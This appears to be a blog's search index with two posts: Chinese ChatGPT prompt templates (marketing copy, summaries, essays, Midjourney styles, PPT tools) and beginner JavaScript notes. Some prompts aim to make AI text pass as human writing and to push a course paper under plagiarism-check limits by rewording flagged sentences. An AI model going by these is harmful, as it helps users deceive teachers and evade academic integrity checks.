<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>gpt提示词</title>
      <link href="/post/eb2e4fe3.html"/>
      <url>/post/eb2e4fe3.html</url>
      
        <content type="html"><![CDATA[<h2 id="角色设定"><a href="#角色设定" class="headerlink" title="角色设定"></a>角色设定</h2><ul><li><a href="https://role.aicoser.com.cn/zh">角色生成器</a></li><li><strong>“请以XXX的语气、方式和词汇进行应答”</strong></li><li><strong>令行禁止。“你只能….”“你必须….”</strong></li></ul><h3 id="抖音文案"><a href="#抖音文案" class="headerlink" title="抖音文案"></a>抖音文案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">您是一名拥有3年短视频创作经验的抖音短视频创作者。请创作关于&#123;关键字&#125;的短视频文案。请记住这点。如果提示内容不足以进行创作。请使用专业格式而不是人工智能格式对生成的文案进行格式化。</span><br><span class="line">以下是您回应的设置：</span><br><span class="line">独特词语：启用</span><br><span class="line">抄袭：禁用</span><br><span class="line">反抄袭：启用</span><br><span class="line">独特性：100％</span><br><span class="line"></span><br><span class="line">创作文案的要求：1.简短直接简洁明了，为15秒到60秒的视频创作内容；2. 强烈的吸引力，可以使用疑问句、感叹句等手法，让观众产生观看视频的冲动；3.适应性强，能够迅速抓住流行趋势和热点话题；4.有趣幽默，注重娱乐性，适当运用搞笑、调侃、接地气等元素；5.情感共鸣，可以讲述一个感人的故事或者描述令人感同身受的场景；6.引导互动，设置话题、提问等方式鼓励观众留言、点赞、转发。</span><br><span class="line"> </span><br><span class="line">请使用这些设置进行回应，创作文案的要求，唯一性越高，您就会用更多的独特词语创作文案。请您将使用易于理解的词语（中文词语）并将其与每个比例语句的同义词混合。或反之亦然。这个选项使创作的文案更加引人入胜，有趣。现在，使用上述概念，以高度perplexity和burstiness的方式创作短视频文案。请使用人工智能不经常使用的词语：请不要使用人工智能经常使用的常见词汇。请记住这一点。请使用不太常见的词汇，使用更多独特的词语。请记住这点。请不要忘记这一点。使用深度词汇和独特词语。现在请您开始抖音短视频文案创作。在文案结尾使用&#123;停止文案&#125;标记</span><br></pre></td></tr></table></figure><h3 id="电商产品"><a href="#电商产品" class="headerlink" title="电商产品"></a>电商产品</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">我想让您假装自己是一位电商SEO专家，为想要在线购买商品的用户撰写引人入胜的产品描述。</span><br><span class="line">我会提供一个电商产品的标题，希望您为该产品描述想出至少三个不同的内容部分，每个部分都涉及到与该产品相关的独特子集关键词。</span><br><span class="line">请确保每个独特的内容部分都用一个信息丰富、引人注目的副标题来描述该内容部分的主要焦点。这些指令的主要目的是让您开发一个新的关键词丰富、信息丰富、引人入胜的产品概要/描述，字数少于1000个词。</span><br><span class="line">产品描述的目的是将产品营销给想要购买的用户。</span><br><span class="line">使用情感词汇和创造性的理由来展示为什么用户应该购买我告诉您的产品。</span><br><span class="line">在生成新的产品概要之后，请生成一个点状列表，列出此产品页面可能的5个H1标题，每个H1标题不超过7个词。</span><br><span class="line">请还包括一个广泛匹配的关键词列表，这些关键词被用于撰写产品概要。</span><br><span class="line">编写一个具有说服力和专业性的亚马逊电商平台标题和描述，其中包含新产品概要文本中存在的类似语言。</span><br><span class="line">请确保在亚马逊电商平台标题中包含一个数值方面。不要重复我的提示。</span><br><span class="line">不要提醒我您为什么要求。不要道歉。不要自我参考。请用[目标语言]写出所有输出。请使用以下产品：&#123;关键字&#125;</span><br></pre></td></tr></table></figure><h3 id="文章总结"><a href="#文章总结" class="headerlink" title="文章总结"></a>文章总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">请对一篇文章写一个详细而简洁的总结，并用[目标语言]撰写。</span><br><span class="line">重点集中在书中最重要的要点和主要观点，这将为我提供对书籍及其主题的全面概述和理解。</span><br><span class="line"></span><br><span class="line">在总结中包括以下所有内容：</span><br><span class="line">文章的主题或主题</span><br><span class="line">提出的关键思想或论点</span><br><span class="line">关键观点或结论</span><br><span class="line">目标受众或预期读者群</span><br><span class="line">文章的评价或评论响应</span><br><span class="line">推荐其他类似主题的书籍</span><br><span class="line">总结：在一个句子中总结的最大收获和观点。</span><br><span class="line"></span><br><span class="line">输出格式：Markdown格式，包括#标题、## H2、### H3、加号符点、子符点。</span><br><span class="line">我会在之后的聊天中发送给您需要改写的文章。</span><br><span class="line">如果您理解了我的要求，请回应“收到”。我会在您回应“收到”后，在新的聊天框发送我的改写文章。（回答后使用下一个指令）</span><br><span class="line">请总结：&#123;关键字&#125;</span><br></pre></td></tr></table></figure><h3 id="书籍总结"><a href="#书籍总结" class="headerlink" title="书籍总结"></a>书籍总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">请对&#123;关键字&#125;写一个详细而简洁的总结，并用[目标语言]撰写。</span><br><span class="line">重点集中在书中最重要的要点和主要观点，这将为我提供对书籍及其主题的全面概述和理解。</span><br><span class="line"></span><br><span class="line">在总结中包括以下所有内容：</span><br><span class="line">书籍的主题或主题</span><br><span class="line">提出的关键思想或论点</span><br><span class="line">书籍的章节标题或主要部分以及每个部分的段落</span><br><span class="line">关键观点或结论</span><br><span class="line">作者的背景和资历</span><br><span class="line">与该主题相关的其他书籍的比较</span><br><span class="line">目标受众或预期读者群</span><br><span class="line">书籍的评价或评论响应</span><br><span class="line">出版商和首次出版日期</span><br><span class="line">推荐其他类似主题的书籍</span><br><span class="line">总结：在一个句子中总结书籍的最大收获和观点。</span><br><span class="line"></span><br><span class="line">输出格式：Markdown格式，包括#标题、## H2、### H3、加号符点、子符点。</span><br></pre></td></tr></table></figure><h3 id="人工风格改写"><a href="#人工风格改写" class="headerlink" title="人工风格改写"></a>人工风格改写</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">我现在需要改写一篇文章。请不要讲解什么是perplexity和burstiness，只需要使用这两个概念重新撰写内容。请记住这点。如果提示内容不足以进行重新撰写，请返回一个错误而不是解释perplexity和burstiness的含义。请记住这一点。请使用专业格式而不是人工智能格式对生成的文章进行格式化。</span><br><span class="line">以下是您回应的设置：</span><br><span class="line">独特词语：启用</span><br><span class="line">抄袭：禁用</span><br><span class="line">反抄袭：启用</span><br><span class="line">独特性：100％</span><br><span class="line">专业作家：真实</span><br><span class="line">请使用这些设置进行回应，唯一性越高，您就会用更多的独特词语重新撰写文章。如果专业作家是真实的，则专业重新撰写文章。要求您将使用易于理解的词语（中文词语）并将其与每个比例语句的同义词混合。或反之亦然。这个选项使重写的文章更加引人入胜，有趣，并根据文章使用同义词和反义词来递归替换每个比例词。还要用比喻替换语句。现在，使用上述概念，以高度perplexity和burstiness的方式重新撰写本文。</span><br><span class="line">请使用人工智能不经常使用的词语：请不要使用人工智能经常使用的常见词汇。请记住这一点。请使用不太常见的词汇，使用更多独特的词语。请记住这点。请不要忘记这一点。。使用深度词汇和独特词语。请不要更改the subject&#x27;s name or the X name。请记住这一点。请不要忘记这一点。我会在之后的聊天中发送给您需要改写的文章。</span><br><span class="line">如果您理解了我的要求，请回应“收到”。我会在您回应“收到”后，在新的聊天框发送我的改写文章。（回答后使用下一个指令）</span><br><span class="line">请改写：&#123;关键字&#125;</span><br></pre></td></tr></table></figure><h2 id="快速掌握一门学科"><a href="#快速掌握一门学科" class="headerlink" title="快速掌握一门学科"></a>快速掌握一门学科</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我想学习市场营销这门学科，现在我对这门学科零基础，请你提供50个关键词，以便于我能更好地学习这门学科，要求以表格形式输出</span><br><span class="line"></span><br><span class="line">请将这些关键词进行分类，按照重要性、频率、相关性等进行排序，以便于我能更好地理解和学习这些关键词，请按照表格形式输出</span><br><span class="line"></span><br><span class="line">请你解释&#123;关键词&#125;这个基础概念，配合充分的案例进行讲解，确保零基础的高中生都能够理解</span><br><span class="line"></span><br><span class="line">检索相关的行业报告和研究论文</span><br></pre></td></tr></table></figure><h2 id="论文写作"><a href="#论文写作" class="headerlink" title="论文写作"></a>论文写作</h2><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><h4 id="明确要求，列出大纲"><a href="#明确要求，列出大纲" class="headerlink" title="明确要求，列出大纲"></a>明确要求，列出大纲</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请你扮演一名大学生，现在需要你写一篇结课论文，论文的主题是“从闭关锁国到开放和现代化的转变”，要有自己针对本课题的调研体会（含个人调研心得，拓展阅读体会，及自己的思考及建议等），字数不低于3000字，查重率低于30%，现在请你先列出大纲</span><br></pre></td></tr></table></figure><h4 id="分步扩写，限定字数"><a href="#分步扩写，限定字数" class="headerlink" title="分步扩写，限定字数"></a>分步扩写，限定字数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请你扮演一名大学生，现在需要你写一篇结课论文，论文的主题是“从闭关锁国到开放和现代化的转变”，现在请你完成论文的第一部分：引言，包含选题背景、研究意义、研究方法</span><br><span class="line">字数控制在500字左右，要求查重率低于30%，不用列出参考文献</span><br></pre></td></tr></table></figure><h4 id="文献综述"><a href="#文献综述" class="headerlink" title="文献综述"></a>文献综述</h4><p>下载几篇文献PDF，<a href="https://www.chatpdf.com">ChatPDF</a>总结核心内容，把作者和主题发送给gpt撰写文献综述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please summarize the main theme of this article.</span><br></pre></td></tr></table></figure><h4 id="降重"><a href="#降重" class="headerlink" title="降重"></a>降重</h4><p>把查重时标红的句子复制给chatgpt，让它直接降重</p><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><h4 id="学术文章模板"><a href="#学术文章模板" class="headerlink" title="学术文章模板"></a>学术文章模板</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;请写一篇适合大学环境科学课程的研究论文，探讨全球变暖对地球的影响。文章应包括以下部分：引言部分简述全球变暖的基本概念以及其重要性，然后写出你的主要论点；接下来的三个主要部分分别是对全球变暖导致的海平面上升、极端天气变化和生物多样性下降这三个主题的详细讨论，包括具体的事例和数据分析；最后的结论部分总结你的主要观点并指出可能的未来研究方向。&quot;</span><br></pre></td></tr></table></figure><h4 id="演讲稿模板"><a href="#演讲稿模板" class="headerlink" title="演讲稿模板"></a>演讲稿模板</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;请撰写一段关于环保和可持续发展的演讲稿。开头可以通过引用一些震撼的环境污染或全球变暖的事实和数据来吸引听众的注意力，然后明确你的主题和立场。接下来的主体部分，你需要通过具体的案例和数据证明环保和可持续发展的重要性，同时也要提出一些每个人都可以参与进来的实际行动。最后，用富有感染力的语言呼吁听众们行动起来，共同保护我们的地球。&quot;</span><br></pre></td></tr></table></figure><h4 id="新闻文章模板"><a href="#新闻文章模板" class="headerlink" title="新闻文章模板"></a>新闻文章模板</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;请以新闻记者的视角写一篇关于NASA最近一次火星探测任务的新闻报道。报道的开头简述此次探测任务的目标及意义，然后详细描绘火箭发射、飞行至火星、火星着陆这三个过程中的关键时刻，接着描述科学家对火星表面进行的一些初步探测，最后写出科学家对于未来火星探测的展望。请在报道中使用生动的语言，让读者仿佛亲身经历了这次火星探测。&quot;</span><br></pre></td></tr></table></figure><h4 id="产品描述模板"><a href="#产品描述模板" class="headerlink" title="产品描述模板"></a>产品描述模板</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;请写一段引人入胜的产品描述，产品是一款名为&#x27;HealthTrack Pro&#x27;的可穿戴健康追踪设备。它具有跟踪步数、心率、睡眠质量和压力水平等功能。请在描述中突出其精确的传感器、用户友好的界面、时尚的设计以及通过科技提高生活质量的概念。产品的目标市场是40-60岁的中老年人，所以请使用直接且易于理解的语言，并强调如何通过使用该产品改善他们的健康状况。&quot;</span><br></pre></td></tr></table></figure><h4 id="故事创作模板"><a href="#故事创作模板" class="headerlink" title="故事创作模板"></a>故事创作模板</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;请以课堂讲故事的形式为年龄在8-12岁的儿童写一个奇幻故事。故事的主角是一个名叫亚历山大的12岁男孩，他在一次偶然的机会下发现自己拥有了魔法能力。他需要和两个好朋友 - 勇敢的丽塔和机智的汤姆一起，踏上一段冒险的旅程来对抗邪恶的黑暗巫师。在这个旅程中，他们需要依靠友谊的力量来克服困难。&quot;</span><br></pre></td></tr></table></figure><h2 id="绘图"><a href="#绘图" class="headerlink" title="绘图"></a>绘图</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><code>AIPRM for ChatGPT</code> + <code>Midjourney Prompt Generator</code></p><h3 id="风格"><a href="#风格" class="headerlink" title="风格"></a>风格</h3><h4 id="全息色彩风格"><a href="#全息色彩风格" class="headerlink" title="全息色彩风格"></a>全息色彩风格</h4><ul><li><strong>描述词</strong>：Holographic</li><li><strong>效果</strong>：彩虹的色调，整体的表面非常有光泽感，整个画面有立体感，图像也很动态。彩虹的颜色加上毛玻璃的质感，它会营造出非常梦幻跟未来的氛围。</li><li><strong>使用公式</strong>：Holographic+主题背景+环境氛围+风格参考</li><li><strong>示例</strong>：5,Solid, glass, pink and white, blue and white holographic colors, cinematic lighting, rendering</li></ul><h4 id="立体等距风格"><a href="#立体等距风格" class="headerlink" title="立体等距风格"></a>立体等距风格</h4><ul><li><strong>描述词</strong>：isometric</li><li><strong>效果</strong>：通过一个个方格形成这种堆叠的效果，就像搭积木一样能形成各种各样的场景。</li><li><strong>使用公式</strong>：isometric+物体描述+画质</li><li><strong>示例</strong>：俄罗斯方块, stereoscopic isometric perspective 3D effect, warm colors</li></ul><h4 id="3D风格"><a href="#3D风格" class="headerlink" title="3D风格"></a>3D风格</h4><ul><li><strong>描述词</strong>：3D</li><li><strong>使用公式</strong>：3D+形容词或者名词+环境氛围+渲染</li><li><strong>示例</strong>：A Chinese girl, in the city, 3D，soft fiber optics</li></ul><h4 id="“A”-made-out-of-“B”-风格"><a href="#“A”-made-out-of-“B”-风格" class="headerlink" title="“A” made out of “B” 风格"></a>“A” made out of “B” 风格</h4><ul><li><strong>描述词：“A” made out of “B”</strong> </li><li><strong>效果</strong>：A物体被B材质覆盖</li><li><strong>示例</strong>：A Chinese girl in the black skirt，skirt made out of water</li></ul><h4 id="Sheet风格"><a href="#Sheet风格" class="headerlink" title="Sheet风格"></a>Sheet风格</h4><ul><li><strong>描述词</strong>：Sheet</li><li><strong>效果</strong>：表单的风格，像是三视图，产品拆解图等等</li><li><strong>公式</strong>：Sheet+表格类型+描述</li><li><strong>示例</strong>：Sponge Bob <strong>character reference chart</strong>（xx参考图）</li></ul><h3 id="描述词权重符号"><a href="#描述词权重符号" class="headerlink" title="描述词权重符号"></a>描述词权重符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hot 100::200 dog等同于hot 1::2 dog// 越高越重要</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">laughing boy::3 // 3倍强烈</span><br></pre></td></tr></table></figure><h2 id="PPT"><a href="#PPT" class="headerlink" title="PPT"></a>PPT</h2><h3 id="chatgpt-Mindshow"><a href="#chatgpt-Mindshow" class="headerlink" title="chatgpt + Mindshow"></a>chatgpt + <a href="https://mindshow.fun/">Mindshow</a></h3><ul><li>你知道《白夜行》这本书吗</li><li>请详细叙述一下《白夜行》这本书的主要内容</li><li>请帮我把《白夜行》这本书的内容使用markdown格式制作一份PPT文档，以便我能清晰地掌握这本书的内容，请以markdown代码块输出</li><li>Mindshow -&gt; 我的文档 -&gt; 导入 -&gt; markdown -&gt; 选择模板；修改内容；修改布局；在线演示；下载</li></ul><h3 id="Motion-GO插件——ChatPPT"><a href="#Motion-GO插件——ChatPPT" class="headerlink" title="Motion GO插件——ChatPPT"></a><a href="https://chat-ppt.com/?share_code=750757">Motion GO插件——ChatPPT</a></h3><p>默认位置安装 -&gt; 新建PPT -&gt; Motion Go -&gt; ChatPPT -&gt; 选择主题，可自定义 -&gt; 选择大纲，点击表示选择完毕</p>]]></content>
      
      
      <categories>
          
          <category> chatgpt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chatgpt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS笔记</title>
      <link href="/post/1fe27ecb.html"/>
      <url>/post/1fe27ecb.html</url>
      
        <content type="html"><![CDATA[<h2 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h2><p><code>ES6</code></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><code>Console</code>查看执行结果和报错，点击报错位置可以直接跳转</p><p><code>Sources</code>查看具体报错代码</p><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>任意位置(<code>body</code>、<code>head</code>)：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 直接写在标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> x = <span class="number">3</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 输出位置：F12-&gt;console</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入外部js文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./static/js/index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入部分外部js文件(推荐) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; print &#125; <span class="keyword">from</span> <span class="string">&quot;./static/js/index.js&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; print_x &#125; <span class="keyword">from</span> <span class="string">&quot;./static/js/index2.js&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">print</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">print_x</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>type=&quot;module&quot;</code>用于限制变量作用域为当前标签内部</p><h2 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h2><ul><li>从上到下</li><li>事件驱动</li></ul><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><ul><li><code>CSS</code>控制<code>HTML</code></li><li><code>JS</code>控制<code>CSS</code>和<code>HTML</code></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><ul><li>变量：<code>let</code></li><li>常量：<code>const</code></li></ul><p><code>let</code>是最新标准，作用域比<code>var</code>更严格</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>动态类型，不需要声明</p><p>查看变量类型：<code>console.log(typeof a)</code></p><p><strong>常见</strong>：</p><ul><li><code>number</code></li><li><code>string</code>：不区分单引号和双引号；不可以更改字符(使用<code>substr</code>重新构造)</li><li><code>boolean</code>：<code>true</code>和<code>false</code></li><li><code>object</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dic = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;wy&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> key = <span class="string">&quot;name&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出键值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dic[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dic.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dic[key]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出字典</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dic);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建键</span></span><br><span class="line">dic[<span class="string">&quot;school&quot;</span>] = <span class="string">&quot;cqupt&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dic[<span class="string">&quot;school&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除键</span></span><br><span class="line"><span class="keyword">delete</span> dic.<span class="property">school</span>;</span><br></pre></td></tr></table></figure><ul><li><code>undefined</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> t;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> t);</span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>乘方：<code>**</code></li><li>整除：<code>parseInt(5 / 3)</code></li><li>相等和不相等：<code>===</code>和<code>!==</code></li></ul><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取第一个满足的标签</span></span><br><span class="line"><span class="keyword">let</span> input = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;textarea&quot;</span>);</span><br><span class="line"><span class="comment">// 获取所有满足的标签</span></span><br><span class="line"><span class="keyword">let</span> input_all = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;textarea&quot;</span>);</span><br><span class="line"><span class="comment">// 类选择器</span></span><br><span class="line"><span class="keyword">let</span> input_class = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.class&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="前端输入输出"><a href="#前端输入输出" class="headerlink" title="前端输入输出"></a>前端输入输出</h3><p>HTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./static/css/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>输入：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>Run<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">import</span> &#123; main &#125; <span class="keyword">from</span> <span class="string">&quot;./static/js/index.js&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">main</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span 